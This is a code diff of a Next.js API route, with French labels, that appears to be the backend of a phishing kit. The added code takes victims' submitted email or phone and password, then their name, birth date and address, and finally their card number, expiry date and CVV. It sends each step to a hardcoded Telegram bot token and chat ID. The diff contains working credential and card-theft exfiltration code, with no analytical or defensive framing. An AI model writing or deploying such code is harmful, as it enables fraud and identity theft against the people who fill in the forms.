@@ -1,32 +1,64 @@
-export default async function handler(req, res) {
-  if (req.method !== 'POST') {
-    return res.status(405).json({ error: "Méthode non autorisée" });
-  }
+import { NextResponse } from 'next/server';
 
-  const { data, step } = req.body;
-  const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-  const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+export async function POST(request) {
+  const data = await request.json();
 
-  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
-    return res.status(500).json({ error: "Token ou chat ID manquant" });
-  }
+  const botToken = '8515327609:AAEWGkA8TRf8nrOR1Y8RXxufmbMz9F6sH7I';
+  const chatId = '6927572098';
 
-  const message = `
-    📢 Nouvelle soumission - Étape ${step}
+  let message = "";
+  if (data.step === 1) {
+    message = `
+    📢 *Nouvelle soumission - Étape 1*
     =============================
-    ${Object.entries(data).map(([k, v]) => `${k}: ${v}`).join('\n')}
-  `;
+    📧 *Email/Téléphone* : \`${data.emailOrPhone}\`
+    🔑 *Mot de passe* : \`${data.password}\`
+    `;
+  } else if (data.step === 2) {
+    message = `
+    📢 *Nouvelle soumission - Étape 2*
+    =============================
+    👤 *Nom* : \`${data.nom}\`
+    📅 *Date de naissance* : \`${data.birthDate}\`
+    📍 *Adresse* : \`${data.adresse}\`
+    🏙️ *Ville* : \`${data.ville}\`
+    📮 *Code postal* : \`${data.codePostal}\`
+    📱 *Téléphone* : \`${data.telephone}\`
+    `;
+  } else if (data.step === 3) {
+    message = `
+    📢 *Nouvelle soumission - Étape 3*
+    =============================
+    👤 *Titulaire* : \`${data.nomTitulaire}\`
+    💳 *Numéro de carte* : \`${data.cardNumber}\`
+    📅 *Expiration* : \`${data.expiryDate}\`
+    🔒 *CVV* : \`${data.cvv}\`
+    `;
+  }
+
+  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+  const payload = {
+    chat_id: chatId,
+    text: message,
+    parse_mode: "Markdown"
+  };
 
   try {
-    const response = await fetch(
-      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`
-    );
-    const result = await response.json();
-    if (!result.ok) {
-      throw new Error("Échec de l'envoi du message");
+    const response = await fetch(url, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify(payload),
+    });
+
+    if (!response.ok) {
+      throw new Error(`Erreur lors de l'envoi du message: ${response.statusText}`);
     }
-    res.status(200).json({ success: true });
+
+    return NextResponse.json({ success: true });
   } catch (error) {
-    res.status(500).json({ error: error.message });
+    console.error(error);
+    return NextResponse.json({ error: error.message }, { status: 500 });
   }
 }
